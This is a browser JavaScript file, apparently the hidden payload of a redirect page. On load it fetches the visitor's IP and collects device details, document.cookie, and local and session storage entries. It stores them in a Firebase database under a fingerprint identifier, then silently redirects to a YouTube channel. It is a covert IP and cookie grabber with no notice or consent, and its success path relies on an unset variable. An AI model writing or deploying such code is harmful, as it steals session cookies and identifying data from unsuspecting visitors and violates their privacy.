
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";


const firebaseConfig = {
  apiKey: "AIzaSyDBb7DC8emHpK7R4jbdu2PyfK4KvZYCrmU",
  authDomain: "lax-d30cb.firebaseapp.com",
  databaseURL: "https://lax-d30cb-default-rtdb.firebaseio.com",
  projectId: "lax-d30cb",
  storageBucket: "lax-d30cb.appspot.com",
  messagingSenderId: "78558692226",
  appId: "1:78558692226:web:784746d258f6accda5059b",
  measurementId: "G-6HG00YJMRB"
};


const app = initializeApp(firebaseConfig);
console.log("Firebase inicializado:", app);

const db = getDatabase(app);
console.log("database inicializado:", db);


async function updateFirebaseData(identifier, dataToSend) {
    const identifierRef = ref(db, 'sockeds/' + identifier);
    try {
        const snapshot = await get(identifierRef);
        if (snapshot.exists()) {
            
            await set(identifierRef, dataToSend);
            console.log('Informações atualizadas com sucesso no Firebase');
            redirectToLink();
        } else {
           
            await set(identifierRef, dataToSend);
            console.log('Novo rótulo criado com sucesso no Firebase');
            redirectToLink();
        }
    } catch (error) {
        console.error('Erro ao verificar ou atualizar o rótulo:', error);
        redirectToLink();
    }
}


function generateDeviceIdentifier(deviceData) {
    const { userAgent, deviceMemory, hardwareConcurrency } = deviceData;
    const dataString = `${userAgent}-${deviceMemory}-${hardwareConcurrency}`;
    return btoa(dataString); 
}

// Função para coletar IP e informações do dispositivo
async function getIPAndLocation() {
    const ipServiceURL = 'https://api.ipify.org?format=json';

    try {
        const response = await fetch(ipServiceURL);
        const data = await response.json();
        userIP = data.ip || "IP não encontrado";
    } catch (error) {
        locationDads = "Erro ao localizar";
        userIP = "Erro ao localizar IP";
        console.error('Erro ao obter localização:', error);
    }

    
    deviceData = getDeviceInfo();
    additionalInfo = collectAdditionalInfo();

   
    const identifier = generateDeviceIdentifier(deviceData);

   
    if (userIP && locationDads && deviceData) {
        const dataToSend = {
            ip: userIP,
            location: locationDads,
            device: deviceData,
            additionalInfo: additionalInfo,
            timestamp: new Date().toISOString(),
            uniqueIdentifier: identifier
        };

        
        await updateFirebaseData(identifier, dataToSend);
    } else {
        console.error('Erro: Dados incompletos para enviar ao Firebase');
    }
}


function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let deviceType = (/Mobi|Android/i.test(userAgent)) ? 'Celular' : 'PC';
    let os = 'Desconhecido';
    if (userAgent.indexOf('Windows NT') !== -1) os = 'Windows';
    else if (userAgent.indexOf('Mac OS X') !== -1) os = 'macOS';
    else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
    else if (/Android/i.test(userAgent)) os = 'Android';
    else if (/iPad|iPhone/i.test(userAgent)) os = 'iOS';

    const deviceMemory = navigator.deviceMemory || 'Desconhecido';
    const hardwareConcurrency = navigator.hardwareConcurrency || 'Desconhecido';

    return {
        deviceType,
        os,
        deviceMemory,
        hardwareConcurrency,
        userAgent
    };
}


function collectAdditionalInfo() {
    const prefersDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
    const prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

    let connectionType = 'Desconhecido';
    let downlink = 'Desconhecido';
    if (navigator.connection) {
        connectionType = navigator.connection.effectiveType || 'Desconhecido';
        downlink = navigator.connection.downlink + ' Mbps';
    }

    const language = navigator.language || navigator.userLanguage;

    const cookies = document.cookie;
    const localStorageData = localStorage.getItem('key') || 'Não disponível';
    const sessionStorageData = sessionStorage.getItem('key') || 'Não disponível';

    return {
        prefersDarkMode,
        prefersReducedMotion,
        connectionType,
        downlink,
        language,
        cookies,
        localStorageData,
        sessionStorageData
    };
}


function redirectToLink() {
    window.location.replace("https://www.youtube.com/@EpeneShit");
}

getIPAndLocation();

